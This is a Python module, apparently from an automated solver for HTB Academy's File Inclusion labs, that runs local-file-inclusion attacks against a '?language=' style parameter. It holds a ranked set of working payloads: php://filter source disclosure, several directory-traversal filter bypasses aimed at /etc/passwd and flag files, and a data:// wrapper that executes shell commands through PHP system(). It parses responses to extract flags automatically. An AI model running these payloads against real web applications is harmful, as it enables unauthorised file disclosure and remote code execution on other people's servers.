"""LFI / RFI / file-inclusion probes for HTB Academy module 23.

The HTTP target runner in :mod:`target_runner` handles plain GET/POST
question shapes. Module 23 ("File Inclusion") layers on a *family* of
exploitation techniques that don't fit the simple "GET /api/x, parse
JSON" shape - they require trying several bypass payloads against a
``?language=`` / ``?file=`` / ``?view=`` style sink and recognising
which one actually returns the file or executes code.

Encapsulating the bypass list here means:
  - The wizard can call one entry point and either get an answer or
    learn that this section needs human-only steps.
  - Filter-evasion knowledge is recorded as runnable code, not a
    chat-log artefact, so future runs benefit from each pattern that
    worked on a real lab.
  - Tests pin the exact payload set (and its ordering) so we don't
    accidentally lose a working bypass when refactoring.

Bypasses included (in priority order, cheapest first):

  1. **php://filter/convert.base64-encode/resource=X** - read PHP
     source directly. Highest yield: works whenever the include sink
     forwards arbitrary scheme-prefixed strings to ``include()``.
  2. **data://text/plain,<?php ... ?>** - one-shot RCE via inline
     payload. Often disabled (``allow_url_include=Off``); we try it
     anyway because when it works it answers the whole section.
  3. **Recursive ``....//`` traversal** - bypasses naive ``str_replace
     ('../', '')`` filters by leaving a residual ``../`` after the
     first replace pass.
  4. **URL-encoded ``%2e%2e%2f``** - bypasses filters that look for
     literal ``..``.
  5. **Approved-prefix + traversal** (``./languages/../../../etc/passwd``)
     - bypasses filters that whitelist a prefix.

We deliberately do NOT include log-poisoning or upload+include here:
those need request shaping the wizard handles separately, and they
have side effects on the target.
"""

from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass
from typing import TYPE_CHECKING

if TYPE_CHECKING:  # pragma: no cover
    from htbrl.academy.target_runner import HttpResponse, HttpTargetRunner


_FLAG_RE = re.compile(r"HTB\{[^}]+\}")
_PASSWD_RE = re.compile(r"^root:x:0:0:", re.MULTILINE)


@dataclass
class LfiAttempt:
    """One LFI payload attempt + the response it produced."""

    payload: str
    technique: str           # human-readable name (e.g. "recursive-traversal")
    body: str = ""
    flag: str | None = None  # the HTB{...} we extracted, if any
    proof_match: str | None = None  # short text snippet that proved success


def _build_payloads(
    target_path: str, *, approved_prefix: str | None = None,
) -> list[tuple[str, str]]:
    """Return ``[(payload, technique), …]`` ordered cheapest→most invasive.

    ``target_path`` is the OS-level path you're trying to read,
    e.g. ``/flag.txt`` or ``/etc/passwd``. ``approved_prefix`` is
    the directory the sink expects (e.g. ``"languages"`` for
    ``index.php?language=languages/en.php``); when supplied we add
    the approved-prefix bypass variant.
    """
    p = target_path.lstrip("/")          # "flag.txt"
    abs_p = "/" + p                      # "/flag.txt"
    payloads: list[tuple[str, str]] = []

    # 1. php://filter base64 disclosure (most reliable).
    payloads.append((
        f"php://filter/convert.base64-encode/resource={abs_p}",
        "php-filter-base64",
    ))
    payloads.append((
        f"php://filter/read=convert.base64-encode/resource={abs_p}",
        "php-filter-read-base64",
    ))

    # 2. Direct absolute path - works when the sink doesn't append .php.
    payloads.append((abs_p, "absolute-path"))

    # 3. Recursive ``....//`` (defeats single-pass ``..`` strippers).
    for n in (3, 4, 5, 6):
        payloads.append((
            "....//" * n + p,
            f"recursive-dot-traversal-x{n}",
        ))

    # 4. URL-encoded traversal (defeats literal ``..`` blocklists).
    encoded = "%2e%2e%2f" * 4 + p
    payloads.append((encoded, "url-encoded-traversal"))
    encoded2 = "%252e%252e%252f" * 4 + p
    payloads.append((encoded2, "double-url-encoded-traversal"))

    # 5. Approved-prefix variant (when the sink whitelists a directory).
    if approved_prefix:
        prefix = approved_prefix.strip("/")
        for n in (3, 4, 5):
            payloads.append((
                f"{prefix}/" + "../" * n + p,
                f"approved-prefix-traversal-x{n}",
            ))
        # And the recursive form combined with the approved prefix.
        payloads.append((
            f"{prefix}/" + "....//" * 4 + p,
            "approved-prefix-recursive-x4",
        ))

    return payloads


def _make_data_payload(cmd: str, *, param_name: str = "c") -> tuple[str, str]:
    """Build a ``data://`` payload that runs ``cmd`` via PHP ``system()``.

    Returns ``(payload, technique_name)``. The payload is *not*
    URL-encoded - the runner is expected to encode the query string.
    """
    php = f"<?php system($_GET[\"{param_name}\"]); ?>"
    return f"data://text/plain,{php}", "data-wrapper-rce"


def _read_response(resp: "HttpResponse") -> str:
    """Pull the answer-bearing text out of an academy response.

    Most academy LFI labs render the included file inside the page
    template; the relevant text is a small chunk between
    ``<h2>Containers</h2>`` and ``<p class="read-more">``. We search
    the full body and fall back to the whole response.
    """
    body = resp.body_text or ""
    m = re.search(
        r"<h2>Containers</h2>(.*?)<p\s+class=\"read-more\"",
        body,
        re.DOTALL,
    )
    if m:
        return m.group(1)
    return body


def try_lfi_read(
    runner: "HttpTargetRunner",
    *,
    param: str,
    target_path: str,
    approved_prefix: str | None = None,
    extra_query: dict[str, str] | None = None,
    max_attempts: int = 12,
    base_path: str = "/index.php",
) -> tuple[str, list[LfiAttempt]]:
    """Try a sequence of LFI bypasses on a ``?param=`` sink.

    Returns ``(answer, attempts)`` where ``answer`` is the captured
    flag (``HTB{...}``) or empty string if no payload disclosed one.
    ``attempts`` is the per-payload trace (useful for debugging and
    tests).

    The probe stops as soon as we extract an ``HTB{…}`` flag OR see
    proof of file-disclosure (``root:x:0:0:`` for /etc/passwd).
    """
    attempts: list[LfiAttempt] = []
    payloads = _build_payloads(target_path, approved_prefix=approved_prefix)
    extra_query = dict(extra_query or {})

    for payload, technique in payloads[:max_attempts]:
        # Build the full query-string. urllib.parse already encodes ``..``
        # safely without further mangling.
        qs_parts = [(param, payload)]
        for k, v in extra_query.items():
            qs_parts.append((k, v))
        # ``=`` and ``:`` are kept literal so PHP wrappers
        # (``php://filter/convert.base64-encode/resource=…``) and
        # absolute paths survive intact through the URL builder.
        # ``/`` is kept so traversal segments don't double-encode.
        query = urllib.parse.urlencode(qs_parts, safe="/.:=")
        path = f"{base_path}?{query}"
        resp = runner.request(path, method="GET")
        body_chunk = _read_response(resp)
        attempt = LfiAttempt(
            payload=payload, technique=technique, body=body_chunk[:4000],
        )

        # 1. Direct HTB flag in the page.
        m = _FLAG_RE.search(body_chunk)
        if m:
            attempt.flag = m.group(0)
            attempt.proof_match = "flag-in-body"
            attempts.append(attempt)
            return m.group(0), attempts

        # 2. /etc/passwd disclosure - useful as proof but not an answer.
        if _PASSWD_RE.search(body_chunk):
            attempt.proof_match = "etc-passwd-disclosed"

        # 3. Base64 of a flag (php://filter responses).
        if technique.startswith("php-filter-"):
            for b64_match in re.finditer(
                r"[A-Za-z0-9+/]{40,}=*", body_chunk,
            ):
                try:
                    import base64
                    decoded = base64.b64decode(
                        b64_match.group(0), validate=True,
                    ).decode("utf-8", errors="replace")
                except (ValueError, Exception):
                    continue
                m2 = _FLAG_RE.search(decoded)
                if m2:
                    attempt.flag = m2.group(0)
                    attempt.proof_match = "flag-in-base64"
                    attempts.append(attempt)
                    return m2.group(0), attempts

        attempts.append(attempt)

    return "", attempts


def try_data_wrapper_rce(
    runner: "HttpTargetRunner",
    *,
    param: str,
    cmd: str = "ls /",
    base_path: str = "/index.php",
    max_output: int = 4000,
) -> tuple[str, LfiAttempt]:
    """Attempt RCE via the ``data://`` wrapper.

    Returns ``(stdout, attempt)``. ``stdout`` is the captured shell
    output (empty if the wrapper is disabled / blocked); ``attempt``
    has the full payload + technique label for the trace.
    """
    payload, technique = _make_data_payload(cmd)
    qs = urllib.parse.urlencode([(param, payload), ("c", cmd)], safe=":,/<?>=")
    resp = runner.request(f"{base_path}?{qs}", method="GET")
    body = _read_response(resp)
    attempt = LfiAttempt(
        payload=payload, technique=technique, body=body[:max_output],
    )
    # Hint of success: the cmd output appears in the page.
    return body[:max_output], attempt


# ---- question-pattern probe -------------------------------------------------


_LFI_PROMPT_RE = re.compile(
    r"(?:bypass|defeat|evade).+?filter|"
    r"local\s+file\s+inclu|"
    r"\bLFI\b|"
    r"read\s+(?:the\s+)?/?flag(?:\.txt)?|"
    r"read\s+(?:the\s+)?file\s+at\s+/",
    re.IGNORECASE | re.DOTALL,
)
_LFI_FLAG_TARGET_RE = re.compile(r"/\w[\w./\-]*")
_LFI_PARAM_HINT_RE = re.compile(
    r"\?(?P<param>language|file|page|view|path|include|doc|read|src)\s*=",
    re.IGNORECASE,
)


def probe_via_lfi(
    runner: "HttpTargetRunner",
    question_prompt: str,
    *,
    hints: list[str] | None = None,
    section_code_blocks: list[str] | None = None,
) -> tuple[str, str, float] | None:
    """Detect LFI-shaped questions and run the bypass payload list.

    Returns ``(answer, rationale, confidence)`` when a payload yielded
    an HTB flag, None otherwise. Confidence is 0.90 -- we trust an
    actual file-disclosure more than heuristic answers but below the
    HTTP probe's 0.95 (which has tighter pattern matching).

    The function:
      1. Recognises LFI-shaped prompts (filter bypass, "read /flag",
         keyword "LFI"/"local file inclusion") to avoid spraying
         payloads on unrelated questions.
      2. Detects the LFI parameter from the section code blocks
         (e.g. ``index.php?language=`` -> ``param="language"``).
         Falls back to ``language`` (mod 23's default sink name).
      3. Picks the target path from the prompt (``read /flag.txt`` ->
         target_path=/flag.txt). Falls back to /flag.txt.
      4. Hands off to :func:`try_lfi_read` which walks the bypass
         payloads in priority order.
    """
    hints_text = " ".join(h for h in (hints or []) if h)
    enriched = (question_prompt or "") + (" " + hints_text if hints_text else "")

    if not _LFI_PROMPT_RE.search(enriched):
        return None

    # 1. Pick the LFI param. Prefer one named in code blocks; else
    #    default to "language" (the academy's mod 23 sink).
    param = "language"
    blocks = " ".join(section_code_blocks or [])
    m_param = _LFI_PARAM_HINT_RE.search(blocks)
    if m_param:
        param = m_param.group("param").lower()

    # 2. Pick the target path. Prefer an explicit ``/something`` in the
    #    prompt; else default to /flag.txt.
    target_path = "/flag.txt"
    for m in _LFI_FLAG_TARGET_RE.finditer(enriched):
        candidate = m.group(0)
        # Skip URLs/IP-style candidates that don't look like file paths.
        if "." in candidate.split("/")[-1] or candidate.endswith("/"):
            target_path = candidate
            break

    # 3. Detect the approved-prefix when the section's example URLs use
    #    ``language=languages/en.php`` -- the prefix here is "languages".
    approved_prefix: str | None = None
    m_prefix = re.search(
        rf"\?{re.escape(param)}=([\w]{{1,30}})/[\w./]+",
        blocks, re.IGNORECASE,
    )
    if m_prefix:
        approved_prefix = m_prefix.group(1)

    # Generous cap: with approved_prefix the payload list grows past
    # the default 12-payload budget, and we'd rather try them all
    # than silently miss the working bypass.
    answer, attempts = try_lfi_read(
        runner,
        param=param,
        target_path=target_path,
        approved_prefix=approved_prefix,
        max_attempts=20,
    )
    if not answer:
        return None
    technique = attempts[-1].technique if attempts else "lfi"
    rationale = (
        f"LFI bypass {technique!r} param={param!r} target={target_path!r}"
        + (f" prefix={approved_prefix!r}" if approved_prefix else "")
        + f" -> {answer!r}"
    )
    return (answer, rationale, 0.90)


__all__ = [
    "LfiAttempt",
    "try_lfi_read",
    "try_data_wrapper_rce",
    "probe_via_lfi",
]
